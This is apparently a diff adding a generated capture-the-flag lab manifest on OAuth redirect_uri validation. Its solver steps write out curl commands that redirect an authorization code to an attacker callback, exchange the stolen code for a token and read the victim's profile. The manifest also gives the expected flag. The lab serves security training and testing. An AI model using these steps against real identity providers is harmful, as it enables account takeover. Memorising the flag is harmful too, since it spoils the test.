@@ -1,0 +1,39 @@
+# Generated from platform/labs/Identity/identity-1-2-oauth-oidc-sso/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: identity-1-2-oauth-oidc-sso
+track: Identity
+difficulty: intermediate
+source: platform/labs/Identity/identity-1-2-oauth-oidc-sso/lab.yaml
+expected_services:
+- port: 80
+  protocol: tcp
+- port: 8080
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/identity-1-2-oauth-oidc-sso.sh
+  steps:
+  - name: Community ID page responds
+    command: curl -s -o /dev/null -w '%{http_code}' http://{target.portal}:8080/
+    expect: '200'
+  - name: Provider redirects the code to the unvalidated callback
+    command: curl -s -o /dev/null -w '%{redirect_url}' 'http://{target.portal}:8080/authorize?client_id=community-portal&redirect_uri=http://identity-oauth.lab:8080/attacker&response_type=code&state=demo' | grep -c '/attacker?code=AUTH-CODE-7f3a'
+    expect: '1'
+  - name: The stolen code exchanges for an access token
+    command: curl -s 'http://{target.portal}:8080/token?code=AUTH-CODE-7f3a&client_id=community-portal' | grep -c 'ACCESS-TOKEN-amara-7f3a'
+    expect: '1'
+  - name: The profile endpoint rejects an anonymous request
+    command: curl -s -o /dev/null -w '%{http_code}' http://{target.portal}:8080/me
+    expect: '401'
+  - name: The stolen access token reveals the victim token
+    command: curl -s 'http://{target.portal}:8080/me?access_token=ACCESS-TOKEN-amara-7f3a' | grep -o 'OCR{[^}]*}'
+    expect: OCR{redirect_uri_trust_is_not_authentication}
+expected_flag_count: 1
+expected_flag: OCR{redirect_uri_trust_is_not_authentication}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 384
+max_cpu: 0.4
